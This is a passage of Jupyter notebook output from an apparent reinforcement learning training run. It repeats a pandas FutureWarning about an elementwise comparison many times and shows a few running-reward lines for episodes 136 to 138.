      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -3955.04\t Episode 136\t Frame count: 415642\t Context: 2\n",
      "Running reward: -3955.04\t Episode 136\t Frame count: 419995\t Context: 2\n",
      "Running reward: -3999.51\t Episode 137\t Frame count: 421831\t Context: 2\n",
      "Running reward: -3999.51\t Episode 137\t Frame count: 423182\t Context: 2\n",
      "Running reward: -4027.74\t Episode 138\t Frame count: 423448\t Context: 2\n",
      "Running reward: -4027.74\t Episode 138\t Frame count: 423559\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
